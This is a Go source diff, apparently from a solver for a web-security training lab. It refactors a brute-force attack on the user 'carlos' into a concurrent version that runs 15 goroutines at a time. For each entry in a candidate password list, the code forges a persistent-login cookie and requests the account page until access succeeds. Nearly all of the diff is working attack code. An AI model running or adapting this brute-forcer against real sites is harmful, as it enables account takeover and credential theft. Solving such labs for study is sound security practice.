@@ -26,10 +26,8 @@ func solve(hostname string) {
 			- If redirect (302 http status), try again
 			- Otherwise (200 http status), the password is known!
 	*/
-	targetUser := "carlos"
 
 	candidatePasswords, err := readFromFile("assets/candidate-passwords.txt")
-
 	if err != nil {
 		log.Printf("Error reading the file %s", err)
 		return
@@ -37,18 +35,51 @@ func solve(hostname string) {
 
 	log.Printf("Found %d candidates passwords", len(candidatePasswords))
 
-	for _, password := range candidatePasswords {
-		cookieValue := createCookieValue(targetUser, password)
-		log.Printf("Cookie value: %s", cookieValue)
-		foundValue, err := attemptToAccessMyAccount(hostname, cookieValue)
-		if err != nil {
-			log.Printf("Error while trying to access my account: %s", err)
-		}
+	targetUser := "carlos"
+	bruteForce(hostname, targetUser, candidatePasswords)
+}
 
-		if foundValue {
-			log.Printf("Found password! It is: %s", password)
+func bruteForce(hostname string, targetUser string, candidatePasswords []string) {
+	found := make(chan bool)
+	done := make(chan bool)
+	maxRoutines := 15 // Limits the number of routines to not overflow the number of sockets that can be open
+
+	routinesCalled := 0
+	for _, password := range candidatePasswords {
+		go passwordAttempt(hostname, targetUser, password, found, done)
+		routinesCalled++
+
+		if routinesCalled == maxRoutines {
+			for routinesCalled > 0 {
+				<-done
+				routinesCalled--
+			}
 		}
 	}
+
+	<-found
+}
+
+func passwordAttempt(
+	hostname string,
+	targetUser string,
+	candidatePassword string,
+	found chan bool,
+	done chan bool,
+) {
+	cookieValue := createCookieValue(targetUser, candidatePassword)
+	log.Printf("Cookie value: %s", cookieValue)
+	foundPassword, err := attemptToAccessMyAccount(hostname, cookieValue)
+	if err != nil {
+		log.Printf("Error while trying to access my account: %s", err)
+	}
+
+	if foundPassword {
+		log.Printf("Found password! It is: %s", candidatePassword)
+		found <- true
+	}
+
+	done <- true
 }
 
 func readFromFile(filePath string) ([]string, error) {
